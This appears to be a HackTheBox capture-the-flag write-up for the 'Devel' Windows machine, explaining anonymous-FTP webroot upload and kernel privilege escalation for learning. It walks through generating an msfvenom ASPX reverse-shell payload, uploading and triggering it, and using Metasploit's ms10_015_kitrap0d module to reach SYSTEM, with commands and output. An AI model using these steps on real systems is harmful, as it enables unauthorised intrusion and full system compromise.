# HackTheBox - Devel Writeup

**Difficulty:** Easy
**OS:** Windows
**IP:** 10.129.x.x (variable per instance)

---

## Overview

Devel is an easy-difficulty Windows machine that exposes an anonymous FTP
service whose root directory is shared with the IIS webroot. This
misconfiguration allows an attacker to upload an ASP.NET webshell via FTP
and execute it through the web server to gain an initial foothold. Privilege
escalation to `NT AUTHORITY\SYSTEM` is achieved through a well-known local
Windows kernel exploit.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sV -sC -p- 10.129.x.x
```

**Results:**

| Port | Service | Version              |
|------|---------|-----------------------|
| 21   | ftp     | Microsoft ftpd         |
| 80   | http    | Microsoft IIS httpd 7.5 |

Two open ports, both Microsoft services - strongly suggests a Windows box
with a default IIS install and an FTP service that may allow anonymous
access.

---

## Enumeration

### FTP - Anonymous Login

```bash
ftp 10.129.x.x
Name: anonymous
Password: anonymous@anonymous.com
```

Login succeeds. Listing the directory:

```
ftp> dir
229 Entering Extended Passive Mode (|||xxxxx|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

The files `iisstart.htm` and `welcome.png` are the **default IIS landing
page assets**. This is a strong indicator that the FTP root directory is the
same as the IIS webroot (`C:\inetpub\wwwroot`).

### HTTP - Confirming the Webroot

Browsing to `http://10.129.x.x/` shows the default IIS 7 welcome page,
confirming the same files seen over FTP are being served on port 80.

---

## Exploitation - Initial Foothold

Since the FTP root and web root are shared, and anonymous FTP allows
**write** access, an ASP.NET webshell/payload can be uploaded via FTP and
then triggered by requesting it over HTTP.

### 1. Generate an ASPX Meterpreter Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 -f aspx -o shell.aspx
```

### 2. Upload via FTP

```bash
ftp 10.129.x.x
Name: anonymous
Password: anonymous@anonymous.com
ftp> put shell.aspx
ftp> bye
```

### 3. Set Up a Metasploit Handler

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run
```

### 4. Trigger the Payload

Request the uploaded file in a browser or with curl:

```
http://10.129.x.x/shell.aspx
```

The handler catches a Meterpreter session running as the IIS application
pool identity (low-privileged).

```
[*] Sending stage (...) ...
[*] Meterpreter session 1 opened
```

---

## Privilege Escalation

### Fixing the Working Directory

The initial Meterpreter session lands as `IIS APPPOOL\Web`:

```
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

By default the working directory is `c:\windows\system32\inetsrv`, which
this user does **not** have write permissions for. Most of Metasploit's
Windows privilege escalation modules need to write a file to the target
during exploitation, so the working directory must be changed first:

```
meterpreter > cd %TEMP%
meterpreter > pwd
C:\Windows\TEMP
```

### Local Exploit Suggester

```
meterpreter > background
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

Since the target is x86 architecture, `local_exploit_suggester` gives
fairly reliable results (unlike on x64 builds). The module recommends
several modules, including:

- `exploit/windows/local/bypassuac_eventvwr`
- `exploit/windows/local/ms10_015_kitrap0d`
- ...and 9 more...

### Exploiting the Suggestions

**First attempt - `bypassuac_eventvwr` fails**, because the `IIS APPPOOL\Web`
user is not a member of the local Administrators group (expected - it's a
UAC bypass, not a privilege escalation on its own).

**Second attempt - `ms10_015_kitrap0d` succeeds:**

```
use exploit/windows/local/ms10_015_kitrap0d
set SESSION 1
set LHOST <YOUR_IP>
set LPORT 4444
run
```

```
[*] Started reverse TCP handler on <YOUR_IP>:4444
[*] Launching notepad to host the exploit...
[+] Process <PID> launched.
[*] Reflectively injecting the exploit DLL into <PID>...
[*] Injecting exploit into <PID>...
[*] Exploit injected. Injecting payload into <PID>...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179267 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened
```

A new Meterpreter session opens as `NT AUTHORITY\SYSTEM`:

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Flags

```
meterpreter > cat c:\Users\babis\Desktop\user.txt.txt
meterpreter > cat c:\Users\Administrator\Desktop\root.txt.txt
```

> Note the double `.txt.txt` extension - this is how the flag files are
> actually named on the box (a quirk of the machine author), not a typo in
> this writeup.

---

## Key Takeaways

1. **Anonymous FTP + writable webroot is a critical misconfiguration.**
   Any service that shares a directory between file transfer and code
   execution (FTP + web server) turns an upload primitive into remote code
   execution.
2. **Old, unpatched Windows kernels have many known local exploits.**
   `local_exploit_suggester` is a good starting point and is fairly reliable
   on x86 targets (less so on x64). Not every suggested module will work -
   `bypassuac_eventvwr` failed here because the initial user wasn't a local
   admin - so be ready to try several candidates.
3. **Watch your working directory.** Many Metasploit local exploits need to
   write a file to disk on the target. If the current directory isn't
   writable by the session's user (as with IIS's default app pool
   directory), the exploit will fail for a reason that has nothing to do
   with the vulnerability itself.
4. **Default file listings are useful fingerprints.** Recognizing
   `iisstart.htm` / `welcome.png` immediately signals "this is the IIS
   default webroot," which is what tied the FTP and HTTP services together.

---

## Tools Used

- `nmap`
- `ftp` (CLI client)
- `msfvenom`
- Metasploit Framework (`exploit/multi/handler`,
  `post/multi/recon/local_exploit_suggester`,
  `exploit/windows/local/bypassuac_eventvwr`,
  `exploit/windows/local/ms10_015_kitrap0d`)
